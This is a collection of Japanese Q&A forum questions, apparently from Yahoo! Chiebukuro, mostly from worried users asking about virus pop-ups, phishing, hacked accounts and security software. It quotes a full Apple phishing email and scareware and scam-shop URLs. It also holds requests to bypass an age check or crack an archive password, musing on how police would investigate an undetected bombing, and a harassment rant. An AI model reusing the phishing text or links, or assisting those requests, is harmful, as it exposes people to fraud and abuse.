緊急です！！！以前何回も検索していた あるサイト(ブログなようなもの)にアクセスして 一文字だけコピーペーストしようと思い SNSに一旦貼り付けにいったところ 貼り付けできなくなり、そのあとサイトに戻ると「あなたのアクセスしたサイトによってあなたのデバイスがウイルスに感染しました」といった内容の警告？がきました！ 一応ホームボタンをダブルクリックしてそのページごと消したのですが、これで良いのでしょうか？ほんとにウイルスに感染してしまったのでしょうか？（ ; ; ） 今まではその文字、普通にコピペできてました！ （iPhoneです！） 長くてすいません
ハワイアンズ 悠健ポイントカード 7月31日にハワイアンズに行くのですが、悠健ポイントカードが家にあり持って行こうと思いましたが、有効期限が2016年の3月31日まででした。 2つ折りになっていて、有効期限は内側に記載されているのですが、表示するさい、バレるとおもいますか？？ ネットでかうと高くなるので、できれば使いたいのですが…
Googleリモートデスクトップ危険でしょうか。教えて下さい。使用しようと思っているのですが、少し怖くて心配なので、、（セキュリティのことで）
7年程前に購入したパソコンをネットに繋げたいのですが、セキュリティ面ですべきことは何でしょうか。とりあえず、ノートンとかのセキュリティソフトをインストールしようと思うのですが、Windowのアップデートもしとかないと危ないでしょうか？ パソコンは7年前に発売された富士通のBIBLO NF/E50 で、Window7が入ってます。ネットは普段スマホで使ってるポケットWi-Fiがあるので、それで繋げる予定です。 また上記以外にセキュリティ面ですべきことはありますか？
大至急！こんなのが出ました！どうしたらいいですか？
外付けハードディスク パソコンについて、詳しく知らない者です。 外付けハードディスクを購入したいと思っています。今、使用しているのは、バッファロー製品なのですが、 2台購入し、2台とも問題がなかったので、 次もバッファローの製品を購入しようかな、と思っています。 今、使用している外付けハードディスクの使用領域を確認すると、 331GBとなっています。 おすすめの外付けハードディスクがありましたら、ご紹介いただけないでしょうか。 今、検討しているのは、 BUFFALOの暗号機能搭載 外付けHDD 2TB HD-LX2.0U3D 12000円くらいの商品です。 暗号機能が付いているのが魅力です。 そのHD-LX2.0U3Dはおすすめできないな。 331GB程度なら、もっと良いのがあるよ。 というのがございましたら、ご紹介いただけないでしょうか。 よろしくお願いいたします。
バッカーズさんに回答リクエストです。 こんばんは。 ご無沙汰しております。 以前にお世話になった者です。 その節は、どうも有難うございました。さて、某カテではオーバーローダーよりも強力なツールを使いまくっている人たちがいるようです。 違反の無い投稿でも、遅くて数時間、早い時には数分で消されてしまうのですが、どのようなメカニズムなのでしょうか？ 当該カテでは、魏軍との関連性が噂されています。 http://chiebukuro.search.yahoo.co.jp/search?p=%E9%AD%8F%E8%BB%8D&fl... ご存知のことが何かありましたら、ご教示をお願い致します。
トロイの木馬について質問です。PREPAR3Dというゲームをインストールするためにホームページからダウンロードしたフォルダの中に入ってるexeファイルを開いて【install】ボタンを押したのですが、アクセスが拒否されましたと表示され、カスペルスキーから『Trojan.Win32.shelma.gjdを検知しました。』と警告が出ました。(下の画像) そのときは警告の画面から解決ボタンを押して大丈夫だったのですが、どうしてもそのゲームをインストールしたかったので開いたexeが入ってるファイルごとカスタムスキャンしたのですが、脅威は検出されませんでしたと出ました。 そのexeを開いてinstallボタンを押したときに脅威が検出されたということは、他の場所にトロイの木馬が入ってる問題のファイルがあるということでしょうか？ それともこのexeファイル自体に問題があるのでしょうか？ ホームページから再ダウンロードして、カスペルスキーを最新のものにアップデートしても結果は同じだったのですがどうしてもこの問題を解決したいので、どなたかわかる人回答よろしくお願いします。
Googleで検索して(iPhoneです)一番下までスクロールすると〇〇県〇〇市 メールアドレスから と出てるのですがどのメールアドレスから情報が取られているのでしょうか？ 住所を設定した覚えはない気がするのですが… あと 住所は微妙に違うところだったりします iPhone自体の位置情報はたまにラジオを聞くときだけオンにしますがそれ以外はオフにしています
ウイルスバスター月額版の有効期限が切れたけどどうすればまた使える？
outlook.live、hotmailでメールを送信した際の受信側に表示される（名前）を変えたい。 ネットで検索するもうまくヒットしなくて変更できなくて困っています。ざっくりしているので、もしもう少し情報がとのことでしたらご指摘願います。。。
竹田城のパワースポットは一体何ですか？ネットを見るとユーチューブで鏡石の事が言われてるし、途中の売店のおじさんは櫛だと言われ私は￥4300を払い購入しましたが、宗教みたいな事が書いてありました、不愉快です、櫛を返品したいです、騙された気がします。朝来市で管理してもらえませんか。 なぜパワースポットを聞くのにお金を払わないといけないのでしょうか？
iPhoneに来ていた迷惑メール通知のメール。 そこに載ってるアドレスを間違えて触ってしまい、 メール画面に切り替わったんですが、未送信なら大丈夫ですよね？ 送られてきたメールは、迷惑メールフィルターにあるため中身は見えません。お知らせメールに載ってた 送信元のところにあったアドレスを指が滑ってクリックしてしまいました。 ウィルスとかの感染が心配です。
ネットを見ていたら広告に出てきたエロサイトを押してしまいました。慌てて戻ろうとしたら「有料会員登録されました」という画面が出てきました。 本当にされたんですか？家に請求来ますか？ 30分以内に誤登録された方はお客様サービスに電話しろという表示が出てきたのですが電話するべきですか？ カウントダウンされています。どうすればいいんでしょうか…
キングソフトインターネットセキュリティをアップロードしたら「天気ボール」が付いてきたのですが、温度が明らかに違います。みなさんは正しく表示されていますか？
Googleアカウントのパスワードを忘れたので「パスワードアシスタンスページ」という所でGoogleのメールアドレスを書き、次に進むと下のような質問が返ってきました。「覚えている最後のパスワード」とは一体何のことでしょうか？
Twitterのアカウントがネットで自分の名前検索すると鍵垢なのに出てきます。これってどーすればネットから消せれるんですか ね？？
Androidのセキュリティーアプリについて質問です。セキュリティーアプリは入れすぎると重くなるということなので、2個だけ入れようと思うのですが、この中でどれがいいでしょうか？また、これ以外に、おすすめの無料セキュリティーアプリはありますか？ 1 AVG 無料版 2 ayast 無料版 3 360 セキュリティー 回答よろしくお願いします！！
アクセス拒否でフォルダーが削除できません。 . フォルダーの削除方法を教えて下さい。 PCでWindows7を使用しているのですが、あるフォルダーを削除しようとすると下記の表示が出ます。――――― フォルダー アクセスの拒否 この操作を実行するアクセス許可が必要です。 このフォルダーを変更するには、Administrators からアクセス許可を得る必要があります。 ――――― ちなみに自分は管理者アカウントでログインしており、このフォルダーのAdministratorsのアクセス許可もフルコントロールになっています。 またコントロールパネルでユーザーアカウントを確認すると、[○○○○（アカウント名）][Administrator][パスワード保護]となっているので、Administratorでログインできているのだと思います。 １つ気になる点は、フォルダーを右クリックして表示されるメニューで、[削除]の左横に青と黄色の盾みたいなマークが表示されています。これが何か影響しているのでしょうか？ どなたか、このフォルダーの削除方法を教えて下さい。
同じ鍵長だったら，RSA暗号は，楕円曲線暗号と比較して，公開鍵から秘密鍵を求めるのに必要な計算量は少ないのですか？RSA暗号は素因数分解の組み合わせが膨大にのぼることを利用しています。それよりも計算量が多いのはなぜですか？
ネットワークについて質問です どのアプリケーション層プロトコルでも暗号化できるプロトコルは次のうちでどれですか？FTP FTPS HTTPS IPsec Telnet 回答お願いします
World Wide Web（www）利用とセキュリティというテーマで具体的な例を用いて教えてください(´･_･`)
AVG AntiVirus FREEで、スケジュール通りに検知してくれません。 パソコンを立ち上げた時よりも終わるときにしたいのですが。○曜日の午後23時と入力しても 次の日（当日０時）になっています。 そして立ち上げたときに検知しているので・・・困っています。
ポケモンGO手に入れた方やオーストラリアのAppleID持ってる人に質問です誕生日(？)記入するところで24歳以上にしても 最小の年要件を満たしていないので、アップルIDを作成できません。 と出るのですがどの数字入れれば通過できるでしょうか...
いきなりシステム警告のようなものが出てきました。 偽物だと知っていたのですぐ消しましたがなぜこういうのが出てきたのか不安です。 多分よくわからないアプリだと思います。 ちなみにウイルスバスターfor au は何も反応なしです。スキャンしても何も出ません。 何かわかる方がいましたら回答よろしくお願いします。
【チップ500枚！】急ぎです。離散対数の問題だと思うのですが、解き方と答えをわかりやすく教えていただけると嬉しいです。よろしくお願いします。（１）12^11(mod133) （２）34^11(mod133) （３）225^29(mod323)
iPhone6s を使っています現在は使っていないiPhone5sもWi-Fiに繋げて 一緒に使っているのですが、 マルチタスクを開くとマルチタスク下部に 『 "iPhone"から 』 と出てきました。 その表示から 使っていないiPhoneでsafariで検索した内容が 現在使っているiPhoneで開けるようになっていました。 その場合、 共有をできなくするようにすることは可能ですか？ また、 safariを開きなにかしらのサイトを見てるときは 同じ家に住んでる人全員 わたしの見ているサイトが分かるということですか？
モデムは月に１回くらい、1時間くらい電源を切った方がいいのでしょうか？
最近ネットの繋がりが悪いです。 ２分ぐらい繋がらなくなる（固まる）時が何度かあります。定期的に繋がらなくなってる気もします。 深夜など、時間問わずに。原因を探そうと思ったらどうしたらいいでしょうか？ ルーターなどがおかしい可能性ありますか？（買って１年ほどです）
こんにちは質問お願いします 先日ＰＣ画面に「アカウントが他の人に使われています」というようなメッセージが出ました。どんな状況なのでしょうか？又どのような対処をすればいいのでしょうか？詳しい方がいらっしゃいましたら教えてください。
暗号解読して欲しいです！！一つは、71400です。 もう一つは、0905 1401 09 1109 1315 030809です！！ どうかよろしくお願いします！
いま、私のプリンターがPCに接続できない状態です。コンビニのコピー機でスキャンして、そのデータを私のPCのOutlookのアドレスに送ることできますか？
Twitterはその気になれば鍵をつけていても、閲覧できてしまうのでしょうか。転職活動中で、なかなかうまくいきません。 話をできる相手もいないので(転職活動は秘密)、Twitterで愚痴を垂れ流してます。 もともとアカウントを公開していて、特定されないよう回りくどい言い方(あー、しんど。とか。)をしてるのがばからしくなってきて、鍵をつけました。ネットだけで繋がってるフォロワーがいたので、全部ブロックしました。 整理すると、私のアカウントははじめは公開していてフォロワーもいた。 途中から鍵をかけて、フォロワー１人だけ残して全部ブロック。１人残したフォロワーは2015年を最後につぶやいておらず、日本人ですが海外にいるため大丈夫かな、とおもって、残しました。私が鍵をつけてからフォローしてるのは有名人とBot、６人だけにしました。 鍵をつけたので、企業名を出したり愚痴を垂れ流してるのですが(中傷はしてない)、ふと、その気になれば、見られちゃうのかな？と心配になりました。 やっぱり実名はネットで出さないのがいいですか？(*_*)
ずっと気になってたんですけど防犯カメラのチェックって いつしますか？ 仮に保存期間が1週間だとして 保存期間が終了する前に チェックしますか？ それともそのまま上書きですか？
子供が変なサイトを開いたらしくALERT 0x01921457サイトから警告音が鳴り 16個？だったかな？のウイルスに感染している為、 こちらにご連絡くださいと書いてあり電話番号も載せてありました。×を押しても消えないのでタスクマネージャーで消しているんですが 数日すると同じ画面が出てそれも同じ時間にでてきます。 どうしら削除できますか？ PCの詳しく無い主婦なので分かりやすく教えてください。 警告音が鳴る度、怖くて仕方ありません。
ポケモンがうちの敷地内に出ないようにする方法ありますか？
ローカルネットワークの環境で無線LAN専用パソコンにルーター経由で接続していたのですが、Windows8から10にアップグレードしたらネットにつながらなくなりました。画面にビルトインadministratorアカウントを使って、Microsoft Edgeを開けません。別のアカウントでサインインしてやり直して下さい、と表示されてしまいます。どうすればネットにつながるのでしょうか？
よくネットで、不確かな情報出回るじゃないですか大体ソースがTwitterとかその辺りで、何の信頼性も信ぴょう性もない情報を信じられる神経が理解できません。何故信じて拡散したりするのでしょうか？
Windows１０にアップグレードしました。 はじめはイヤホンから、音が出なくなったので ネットで調べ、どうにかイヤホンで音が聞けるように なりました。ところが今度はスピーカーから音が出ません。 又ネットで調べたら、今度はスピーカーからは 出るのにイヤホンからでません。 ウィンドウズ１０て、イヤホンかスピーカー どちらからしか、音を聞けないのでしょうか？ 又、そうでない場合はどのようにすれば よいのでしょうか？ 宜しくお願いいたします。
サイバーパトロールとは 警察がどこのネットワークを見てるのですか？例えばLINEの個人トークやTwitterなど わかるかた教えてください カテゴリがわかりません ごめんなさい。 また、どんなものを送ったら 逮捕されるのですか？ 未成年です。
少し調べものをしようとGoogleで検索していて適当なサイトにアクセスしていたらウイルスに頻繁に感染しています。ウイルス対策アプリをインストールして下さいという表示されました。OKをタップせずにそのページのタグを削除してウイルスバスターを確認したらWeb脅威対策の履歴に２件、不正プログラム関連が表示されていました。 そのあと閲覧履歴とキャッシュ、Cookieを削除し再起動しました。 この一連の作業は間違っていますか？ また、ウイルスに感染している可能性は在りますでしょうか？
PCの顔認証についてお聞きします。 当方、lenovo G50を使用しています。 昨日PCやろうと思ったら設定した覚えのない顔認証みたいなのが出てきて困っております。 スタート画面に入りプログラムとかで解除したくともウイルスのようにしつこく出てくる為、身動きが取れない状態です。 こういった場合どうしたら宜しいのでしょうか？ 当方パソコンには詳しくないため、お手柔らかにご教授願います。
no_reply@apple.comから以下のようなメール届いたんですが、詐欺メールでしょうか？ 題名 Your account will be locked : 201926 本文 拝啓、 私たちは、あなたのアカウント情報の一部が誤っていることをお知らせしたいと思います。私たちは、あなたのアカウントを維持するためにお使いのApple ID情報を確認する必要があります。 下のリンクをクリックしてアカウント情報を確認してください。: マイアカウント確認 > 私たちは24時間以内にあなたからの応答を受信しない場合は、アカウントがロックされます。 Appleチーム My Apple ID | サポート | プライバシーポリシー Copyright © 2016 Apple Inc. 全著作権所有。
！）注意 ・ＭＭＥ適用版は、ＭＭＤへの読み込み時に、 ＭＭＤが「応答なし」となり、１分以上ブラックアウトすることがありますが、 異常ではありません。その後通常どうり使えます。 ・読み込み時に重いですが、それ以降の使用に際しては、それほど重くはありません。 ・モデルデータは似た名前が4種類あります。また、モデルデータと同じ名前の別形式のデータも2種類あります。ご注意ください。 内容詳細は、ReadMeをお読みください。 本データ解凍パスワード は下記の文章まるごとです。 エフェクトの読み込みに１分以上かかります と書かれていて、「エフェクトの読み込みに１分以上かかります」といれたんですができないです。 どなたか、解凍パスワードを解除できるソフト教えて下さい
誰かアカウントバンできる人いますか？
最近Googleで調べものをすると写真のような警告がでるのですがこれは素直に従った方がいいのでしょうか？因みに調べものとは英単語なのでやましいものではなくいつも決まったパターン、サイトで警告が出るわけではないです。
誰か助けてっ！Twitterでパスワードを変更しようとしたら試行回数の制限を超えてしまいましたw いくら待ってもなおんないんですが、どーすればいいんでしょうか？
名誉毀損について質問します 企業、団体のお問い合わせフォームに名前を書き込んだ場合名誉毀損に当たりますか?? 悪質なファンについての対応について質問する際、その悪質なファンの現状を報告するときに相手の本名を記入してしまいました。 この場合名誉毀損、そして逮捕などに発展することはありますか??
今は、迷惑メールに対して若年者は慣れきっていて、年配者は気にし過ぎる時代ですか？
インスタグラムに映像と一緒に音楽も付けて投稿した所、著作権の恐れがあるため弾かれました。 画像アップの瞬時に弾かれる、著作権チェックの優秀さに驚きました。 あの数秒で著作権侵害を見極めるシステムを簡単に分かりやすく教えて欲しいです。 ちなみに弾かれた理由は音楽でした。 某アーティスト（インディーズレーベル）自体は世間一般では有名では有りませんが、きちんとアーティスト名とタイトルまで著作権侵害の理由に書かれてました。 ちなみに投稿する時に、文章、ハッシュタグなどにアーティスト名、タイトルなどは記載してませんでした。 これからは著作権に気をつけて投稿しようと思います。
暗号です 11808 98a どう解けばいいのでしょう？
数字の暗号なんですが…1 9 71 201 189 141 9 どなたか解いていただけませんか？
ネットセキュリティに詳しい方、お願いいたします。 全てID非公開で投稿したのに、なぜわかったのでしょうか…？ 数ヵ月前、人間関係の問題にかなり悩まされ、Yahoo!知恵袋に同じような質問を連投してしまったことがあります。 自分でもやり過ぎだと思うほどでした。 でも、それほど悩んでいました。 数ヵ月たち、その問題はどうにか時間が解決してくれたのですが、新たな問題が起き、またも知恵袋に連投してしまったんです。(以前と内容は全く違うことです) が、このたび、以前連投していた人物＝今回連投している人物＝私だと言い当ててくる回答者がいました。 「前も連投してた人だよね？もっと面白いストーリーはないの？」と、以前の質問も事細かに知っていて、中傷的な回答をしてきていました。 読んだ瞬間、血の気がサッと引き、怖くなりました。 その回答者のmy知恵袋を見てみたら、質問も回答も（私につけた回答）1個のみで、そのために作ったIDなのだと分かりました。 連投するということは、こうしたセキュリティ？の問題が起きるとは薄々思っていましたが、いざ起きると本当に怖くてたまらないです。 どうしてバレたのでしょうか？ 年齢と性別しか書いてません。 文章の書き方とかでバレたのでしょうか。 何か他に生じるセキュリティの問題はあるのでしょうか。 怖くてたまらないです。
パスワード記憶をブラウザでするのと専用アプリでするメリットとデメリットは？Google Chrome のパスワード管理 専用アプリ Keepass で管理 この2つを比較した場合それぞれの優位点をアドバイスお願いします。
単刀直入に聞きます、LINEの電話は盗聴出来ますか？ ネットワーク接続ですが…。
iPhoneです。セキュリティの質問が分からなくなり、自分で調べサイトまでは行ったのですが修復用メールアドレスを登録しているにも関わらず質問の変更ができません。電話する意外の方法ありますか？
SAPパスワードについて。 先日、SAPログイン時にパスワードを2回間違えてしまいました。 次にログインする際、1回間違えるとロックされてしまうのでしょうか？ それとも一定日数経つと間違った回数はリセットされるのでしょうか？ 教えてください。。
知恵袋をお楽しみの皆様、スルーして下さい♪チンカスハッカーkanechan2017くん♪ 「いつまでやるの」って…？ 大学生が低能の中卒に論破されまくって、だいぶきてまちゅか？許してほちぃんでちゅか？w 謝罪するチャンスも、何回も与えまちたけどぉ？？ 免許もないのに、車の運転に対してAするから、君だけ返答ありまちぇんでしたねぇ…w w 中卒に負けてまちぇんかぁ？？？ しかもAの内容が…レベル低く♪w 中卒でも、君みたいなウンコA思いつかないし、書かない…WWWW 恥ずかしくないのかなぁ？？？ カス大学二年生の君には合ってるかもっw 君のお陰でぇ、最近BA頂いておりますよぅ♪ 今日の朝、何と4件もっ！！！ 大学生が、低能な中卒に負けてまちゅねぇ…W 中卒に、論破され…W 知恵袋の皆様には…BA貰えず…WW お前のせいで、何の罪もない知恵袋の皆様が迷惑してるぞ！ いいかげん、Aするのは、やめるのだっ！w 人と、接するのが苦手で知恵袋でしか物が言えないカスが、偉そうに人生相談にAするのは、おかしいと思う…www その根暗な性格、人間性を治してからA しようぜっw お前の知恵袋人生は、THE END♪だよぅwww 大学二年生なんだから、はやく外に出てバイトしなさい！ お父さんお母さんが泣いてるよぅ…（ ｉ _ ｉ ） ハイ ロー オーストラリア バイナリー チート チーター ハック ハッカー JK 失恋 彼女 不倫 GTA
悪質なファンの対応について公式サイトのお問い合わせフォームに質問したのですが、ネットで炎上している悪質なファンの現状を記入する際に相手の名前を記入してしまいました。この場合逮捕、もしくは訴訟になったりするのでしょうか?? 衝動的に行動してしまい後悔しています。
ポート開放をしているときに今どの番号が開いているのかな？と思い確認して 出てきた番号をいろいろ調べたところ 5000番というのが危険とネットに載っていて質問させていただきました 本当に危険なんでしょうか?? 対処法があれば、お願いします
よく大学を爆発予告したりしますが本当に爆発したら警察はどう捜査するんでしょうか？昼間学生に紛れて仕掛ければ住民にも聞けないし、センサーも防犯カメラも吹き飛ぶから捜査しようがなくないですか？
rsa/1024ビット交換ってなんですか？
最近Acerのw3 810 を買ったのですがネットからフリーゲームをダウンロードしようとすると2～3時間と表示されます。これを早くする方法は、ありませんか？
写真から特定は可能？初めまして、とあるオンラインゲームで仲良くなった人が数人います。 普段はその仲良しな人たちとツイッターでやり取りをしており、(現実のアカウントではなく、ゲームアカウントです) 私含めみんな学生で、自分の学校がきれい、自分の学校が汚い、などという話で盛り上がったのです。 そして何故かじゃあ誰の学校が一番汚いか勝負しようぜみたいな話になってしまいました。 今日自分の学校の写真を見せ合おうという事になってます。 一応写真は撮りました。 学校の廊下の写真で、窓ガラスは光が入ってきてて白く写っており外の景色は見えず、あとは廊下と壁、誰かの置いたカバンなどが少し写ってる程度です。 生徒や先生は誰も写ってなくて景色だけです。 でも最近すぐに特定とかされてる人がいるので、安易に自分の通ってる学校を載せて良いのか？などと不安になってます。 まさかこの写真では特定されないだろうな～と思うくらい、特定するような物は写ってないんですが何だか不安です。 写真から特定できることはありますか？
DVDのコピーが分かりません。 子供の為に家でも見える様にとＤＶＤＲ－Ｍを購入してレンタルしたＤＶＤをコピーしようと思いましたができません。使ってるパソコンは、レボノのＧ50のノートパソコンです。 ＤＶＤドライブは一つついてるんですが、よくわからなくて困ってます。 ネットで見て試してみたんですが、コピーしたＤＶＤの方がモザイクっていうか、ガタガタな状態でパズルみたいになってて、とてもＤＶＤとして見れるものじゃありません。 できればフリーのソフトからうまい事コピーをしたいんですがご存じの方いましたらよろしくお願いします。
佐賀県の高校のデータ不正アクセスは単に17歳の少年に実力があったということでは？日本では既得権が潰しにかかるけども、アメリカでは逆にハッキングのプロとして賞賛される。 素直に既得権の実力不足だと認めろよ。少年にハッキングされるようなセキュリティしか作れない。されたくないのならセキュリティを強化すれば良い。 理屈としては家の玄関の鍵をかけないで、大金を置いといて泥棒に取られた。 鍵がかけてあれば取られなかった。銀行に預けてれば取られなかった。 これは対策しなかった取られた方が悪い。さも取って下さいという風にしといて取った方が悪いとなるのが日本。 日本に一人の逸材が現れないのもこういう組織体制にあると思うんだよね。
Google Analyticsの新UIでフィルタ設定の項目が無い2016年、Google AnalyticsのUIが新しくなったようですが、リファラスパムを排除するためのフィルタ設定が見当たりません。以前は画面上部メニューの「アナリティクス設定」の「ビュー」から「フィルタ」を選んでいました。 依然としてリファラスパムの攻撃を受けており、フィルタが設定できないと困ります。新UIにおいて、フィルタ設定はどこにあるのでしょうか。
コンピューター関連の質問です。情報セキュリティに関しての脆弱性は、分類すると設計上の脆弱性と実装上の脆弱性,etc...があるそうですが、ここでいう設計、実装の具体例を教えてください。 よろしくお願いします。
たった今、ネットの2ちゃんみたいな所をクリックしたら、この画面が出てきて、バッテリーがウイルス感染中！と出てきました。 アプリのコメントには、騙されるな！と書かれていましたが、アプリの宣伝なんでしょうか？ https://clicklink8.com/gdu/jpash3.html?model=Aquos%20Phone%20XX%20Mini&brand=Softbank&voluumdata=BASE64dmlkLi4wMDAwMDAwMi01ZmEzLTRhZTQtODAwMC0wMDAwMDAwMDAwMDBfX3ZwaWQuLmE3OWJiODAwLTUxMDctMTFlNi04NmJjLWUwZWExNTY2NWEzZV9fY2FpZC4uMTdjMDhhNmEtNjk2Yi00MDgxLWI5NmEtNmI4ODIzM2ZlMDBkX19ydC4uUl9fbGlkLi40NDk1NzNlNy1lZmRhLTRhZTQtYmMxOC04NTkzYmNmN2UwYWJfX29pZDEuLmFhODk5MzM5LTQ5M2UtNDBjYi04NmRhLWZkZDU0M2EzMTQ4NV9fdmFyMS4uNzA5ODE2X19yZC4ub25jbGlja2Fkc1wuXG5ldF9fYWlkLi5fX2FiLi5fX3NpZC4u&zone=709816&cid=197333103298 怖いので何方か回答お願いします！
パソコンのセキュリティソフトに関する質問です。Windows８です。 ウィルスバスターを入れて使っていますが、Windows Defenderが有効でウィルスバスターが無効になってきます。 Windows Defenderを無効に、ウィルスバスターを有効にしたいのですが、『有効にする』『更新』『アクションの実行』がクリック出来ないようになっています。 どうすれば良いのでしょうか？ よろしくお願いします。
至急！2ちゃんねるに書き込んだら自分のIPアドレスを晒してしまったみたいです。名前の欄を空白にして書き込んだら代わりに自分のIPアドレスが入力されてました。 一部伏せますが 1○○-1○○-2○○-2○○が.rev.home.ne.jp と出てしまってました。 これってIPアドレスですよね？ 自宅がバレてしまいますか？ 早く消したいのですが消しかたがわかりません。どうしたらいいでしょうか？(;o;)
Twitterを開いたら「不自然なアクティビティを検出しました。パスワードをリセットして下さい」という主旨の警告が出て、泣く泣くパスワードを変更したのですが、この警告が出るって事はアカウントがハッキングされかけたという事ですか? 一応、警告が出る40分前くらいにツイートを連発したのですが、多少のツイート連発や良いねの連発は不自然なアクティビティの基準に引っ掛からないでしょうか。
私は見知らぬ人とラインのIDを交換してしまいました。始めの方は大丈夫でしたが、だんだん怖くなり相手をごまかしてブロックしてしまいました。 その相手には性別、年齢、ニックネームしか言っていません。 けれど、相手は私のタイムラインのスタンプを押しました。 そのような状況はやばいですか？私の住まいとかわかりますか？
垢が乗っ取られました。自分はツイッターを利用しているんですが、何者かに垢が乗っ取られており、自分には身に覚えのないツイートが最近よくツイートされてます。一度パスワードも変えましたがどうやら意味ないようです。どうすればいいでしょうか？主として使ってる端末はandroidのスマホでそれ以外の自分のどの端末においてこのようなことはありません。どなたかアドバイスお願いします
至急！詳しい方よろしくお願いします！ お礼ありです 電動自転車を購入しようと思い、ネット検索していたところ こちらのサイトを見つけました。 あまりに安すぎるのですが 詐欺でしょうか？ 専門的な知識のある方、よろしくお願いします。 http://www.cxo-web.top/order/item/1000.html
これってポチッとしたらダメなやつですよね？？
難しい暗号の作り方を教えてください
課題なのですが・・・助けてください。確率的な素数判定アルゴリズムであるMiller-Rabin素数判定法を使って，以下の2つの値x, yの素数判定を行いなさい． –x = 155989831133744489000618792422094633515188611249971872145349940660469708785891745069679777409958976845285716683395568015648075842429815881263802579254579961553160903797840201105737206039358697850600097129350761730191063345655409388120904161076071276732116030985219804763441605038602434333758220597998510006611 –y = 95868427160345141568126409995845235283969024733826015380010945104471141619484832363336274476251061216650813158890313851617898084208463481172023360125717932798423866401135469106749792244806106992760303993794241796848409577891138823091443436928161472946321634048937489107020487616609900330506966889727825028453
大学2年、男です。去年両親が離婚し、母親側につきました。 現在、父親とは全く関係がありません。 LINEについての質問です。離婚を機にスマホを替え、LINEのアカウントも新しいものとなりました。替えてからあまり経ってないため、現在LINEの友達は母親と祖父母、学校の友達数10人のみです。私の携帯番号も知りません。私達が父親と連絡を取る術は家電と母親のスマホのショートメールのみです。 しかし、父親から何故か私のLINEに友達申請が来ました。 これはどうしてなのでしょうか。私は機械類には疎いため,よく分からないのですが,コンピューターの技術を駆使すれば出来てしまうのでしょうか。また、このような事の対策等あるでしょうか。
社内パソコン（OS：Windows7）はワークグループとドメインの2種類共存しています。その中でワークグループ配下にNAS（LANDISK）を接続しているのですが、 もともと同じワークグループのパソコンとドメイン配下のパソコンの 両方から参照できていたのが、突然ドメイン配下のパソコンから接続できなくなりました。 「DISK１にアクセスできません。 このネットワークリソースを使用するアクセス許可がない可能性があります。 アクセス許可があるかどうかこのサーバーの管理者に問い合わせしてください。 指定されたサーバーは、要求された操作を実行できません。」 というメッセージが表示されます。 どの様に対応したらいいのかわからず、I-ODATAに問合せしましたが、 I-ODATAの問合せ担当者に言われた「ネットワークセキュリティの”LAN Manager認証レベル”を ”LMとNTLM応答を送信する。（ネゴシエートした場合・・・）”」に設定しましたが、 やはり接続できませんでした。 ほかに方法は無いのでしょうか？
こんばんは今回はVPN？のソフトについて質問です。 VPN Autoconnectというソフトを使ってよく分からずにフロリダやUKのネットワークに繋いでしまいました... http://www.usaip.eu/en/vpnautoconnect.zip お金がかからないか心配です。 初心者でVPNが何なのかもよく分かっておりません。 ネットでよく載ってるVPNのお金はソフト自体のお金なのか、それとも接続料なのか分からず大変不安です。 通信料などを取られたりするのでしょうか？？ どなたか回答よろしくお願いします。 無知の状態でやらなければよかったです。
